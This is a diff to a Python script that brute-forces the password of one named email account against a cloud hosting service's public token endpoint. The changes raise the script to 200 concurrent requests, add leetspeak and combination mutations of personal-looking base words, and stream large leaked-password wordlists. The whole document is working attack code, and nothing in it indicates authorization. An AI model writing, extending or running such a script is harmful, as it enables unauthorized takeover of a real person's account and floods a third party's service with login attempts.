@@ -1,133 +1,163 @@
 import asyncio
 import aiohttp
-import itertools
-import sys
 import time
+import os
+import sys
 
 URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
 EMAIL = "hobotzode1@gmail.com"
-CONCURRENCY = 100
+CONCURRENCY = 200
 
-BASE_WORDS = [
-    "sezaze72", "Romart01",
-    "sezaze", "romart", "Romart", "Sezaze",
-    "hobotzode", "Hobotzode", "hobotzode1", "Hobotzode1",
-    "play2go", "Play2go", "Play2Go",
+CUSTOM_BASES = [
+    "sezaze72", "Romart01", "sezaze", "romart", "Sezaze",
+    "hobotzode", "hobotzode1", "Hobotzode1", "Hobotzode",
+    "play2go", "Play2Go", "cloud", "Cloud",
+    "play2gocloud", "Play2GoCloud", "vmmanager",
 ]
+
+LEET = str.maketrans("aAeEiIoOsStT", "@@33!!00$$77")
+LEET2 = str.maketrans("aAeEiIoOsStTlL", "4433!!0055771!")
 
 SUFFIXES = [
-    "", "!", "!!", "!!!", ".", "..", "1", "12", "123", "1234",
-    "01", "02", "00", "69", "77", "88", "99",
-    "!1", "!@", "!@#", "@", "#", "$", "*",
-    "?", "?!", "1!", "12!", "123!",
+    "", "!", "!!", "!!!", "1", "12", "123", "1234", "12345",
+    "01", "00", "69", "77", "88", "99", "007",
+    "!@", "!@#", "@", "#", "$", "*", "?",
+    "2024", "2025", "2026", "_", "-",
 ]
 
-EXTRA_PASSWORDS = [
-    "admin", "Admin", "admin1", "Admin1", "admin123", "Admin123",
-    "password", "Password", "password1", "Password1", "password123",
-    "root", "Root", "root123", "123456", "12345678", "123456789",
-    "qwerty", "Qwerty", "qwerty123", "letmein", "welcome", "Welcome1",
-    "test", "Test", "test123", "Test123", "guest", "Guest",
-    "sezaze72Romart01", "Romart01sezaze72",
-    "sezaze72!", "sezaze72!!", "Romart01!", "Romart01!!",
-    "Sezaze72", "Sezaze72!", "Sezaze72!!",
-    "romart01", "romart01!", "romart01!!",
-    "SEZAZE72", "ROMART01",
-    "SEZAZE72!", "ROMART01!",
+PREFIXES = ["", "!", "@", "1", "123"]
+
+WORDLISTS = [
+    "rockyou_full.txt",
+    "ncsc100k.txt",
+    "rockyou75.txt",
 ]
 
-
-def generate_passwords():
-    seen = set()
-    passwords = []
-
-    def add(p):
-        if p and p not in seen:
-            seen.add(p)
-            passwords.append(p)
-
-    for base in BASE_WORDS:
-        for suffix in SUFFIXES:
-            add(base + suffix)
-            add(base.capitalize() + suffix)
-            add(base.upper() + suffix)
-            add(base.lower() + suffix)
-            add(base.swapcase() + suffix)
-            # reverse
-            add(base[::-1] + suffix)
-
-    for p in EXTRA_PASSWORDS:
-        add(p)
-
-    return passwords
+found = False
+tried = 0
+start_time = 0
 
 
-found_event = asyncio.Event()
-stats = {"tried": 0, "total": 0, "start": 0}
-
-
-async def try_password(sem, session, password):
-    if found_event.is_set():
-        return None
-    async with sem:
-        if found_event.is_set():
-            return None
-        payload = {"email": EMAIL, "password": password}
-        try:
-            async with session.post(URL, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                stats["tried"] += 1
-                if resp.status == 200:
-                    data = await resp.json()
-                    found_event.set()
-                    return (password, data)
-                # print progress every 50
-                if stats["tried"] % 50 == 0:
-                    elapsed = time.time() - stats["start"]
-                    rps = stats["tried"] / elapsed if elapsed > 0 else 0
-                    print(f"  [{stats['tried']}/{stats['total']}] {rps:.0f} req/s ...", flush=True)
-        except Exception as e:
-            # retry once
+async def worker(sem, session, queue):
+    global found, tried
+    while not found:
+        pw = await queue.get()
+        if pw is None:
+            queue.task_done()
+            break
+        async with sem:
+            if found:
+                queue.task_done()
+                continue
             try:
-                async with session.post(URL, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                    stats["tried"] += 1
+                async with session.post(
+                    URL, json={"email": EMAIL, "password": pw},
+                    ssl=False, timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    tried += 1
                     if resp.status == 200:
                         data = await resp.json()
-                        found_event.set()
-                        return (password, data)
+                        found = True
+                        elapsed = time.time() - start_time
+                        print(f"\n{'='*50}")
+                        print(f"[+] CRACKED! Password: {pw}")
+                        print(f"[+] Response: {data}")
+                        print(f"[*] {tried:,} attempts in {elapsed:.1f}s")
+                        queue.task_done()
+                        return
+                    if tried % 2000 == 0:
+                        elapsed = time.time() - start_time
+                        rps = tried / elapsed if elapsed > 0 else 0
+                        print(f"  [{tried:,}] {rps:.0f} req/s", flush=True)
             except:
                 pass
-    return None
+            queue.task_done()
 
 
 async def main():
-    passwords = generate_passwords()
-    stats["total"] = len(passwords)
-    stats["start"] = time.time()
+    global start_time, tried, found
+    start_time = time.time()
+    seen = set()
+    queue = asyncio.Queue(maxsize=10000)
 
-    print(f"[*] Target: {URL}")
-    print(f"[*] Email:  {EMAIL}")
-    print(f"[*] Passwords: {len(passwords)}")
-    print(f"[*] Concurrency: {CONCURRENCY}")
-    print(f"[*] Starting brute...\n")
-
-    sem = asyncio.Semaphore(CONCURRENCY)
     connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY, ssl=False)
+    sem = asyncio.Semaphore(CONCURRENCY)
 
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [try_password(sem, session, p) for p in passwords]
-        results = await asyncio.gather(*tasks)
+        # start workers
+        workers = [asyncio.create_task(worker(sem, session, queue)) for _ in range(CONCURRENCY)]
 
-    elapsed = time.time() - stats["start"]
-    hit = [r for r in results if r]
+        async def enqueue(pw):
+            if found:
+                return
+            if pw and 4 <= len(pw) <= 40 and pw not in seen:
+                seen.add(pw)
+                await queue.put(pw)
 
-    print(f"\n{'='*50}")
-    if hit:
-        pw, data = hit[0]
-        print(f"[+] FOUND! Password: {pw}")
-        print(f"[+] Token: {data}")
-    else:
-        print(f"[-] No match found.")
-    print(f"[*] Tried {stats['tried']} passwords in {elapsed:.1f}s ({stats['tried']/elapsed:.0f} req/s)")
+        # Phase 1: custom mutations
+        print("[*] Phase 1: Custom mutations")
+        for base in CUSTOM_BASES:
+            if found:
+                break
+            forms = [
+                base, base.lower(), base.upper(), base.capitalize(),
+                base.swapcase(), base[::-1],
+                base.translate(LEET), base.translate(LEET2),
+            ]
+            for f in forms:
+                for pre in PREFIXES:
+                    for suf in SUFFIXES:
+                        await enqueue(pre + f + suf)
+
+        # Phase 1b: combos
+        print(f"[*] Phase 1b: Combos (tried {tried:,} so far)")
+        for a in CUSTOM_BASES[:8]:
+            for b in CUSTOM_BASES[:8]:
+                if a != b and not found:
+                    for suf in ["", "!", "123", "1"]:
+                        await enqueue(a + b + suf)
+                        await enqueue(a + "_" + b + suf)
+
+        p1 = len(seen)
+        print(f"[*] Phase 1 done: {p1:,} custom passwords, {tried:,} tried")
+
+        # Phase 2: stream wordlists
+        print("[*] Phase 2: Wordlists (streaming)")
+        for path in WORDLISTS:
+            if found or not os.path.exists(path):
+                continue
+            fname = os.path.basename(path)
+            print(f"  Streaming {fname}...")
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    if found:
+                        break
+                    base = line.strip()
+                    if not base or len(base) < 4 or len(base) > 30:
+                        continue
+                    # raw
+                    await enqueue(base)
+                    # capitalize
+                    await enqueue(base.capitalize())
+                    # + ! and + 123
+                    await enqueue(base + "!")
+                    await enqueue(base + "123")
+                    await enqueue(base.capitalize() + "!")
+                    await enqueue(base.capitalize() + "123")
+                    await enqueue(base + "!!")
+                    await enqueue(base + "01")
+
+        # signal workers to stop
+        for _ in range(CONCURRENCY):
+            await queue.put(None)
+
+        await asyncio.gather(*workers)
+
+    elapsed = time.time() - start_time
+    if not found:
+        print(f"\n{'='*50}")
+        print(f"[-] No match.")
+    print(f"[*] Total: {tried:,} attempts, {len(seen):,} unique, {elapsed:.1f}s ({tried/elapsed:.0f} req/s)")
 
 
 if __name__ == "__main__":
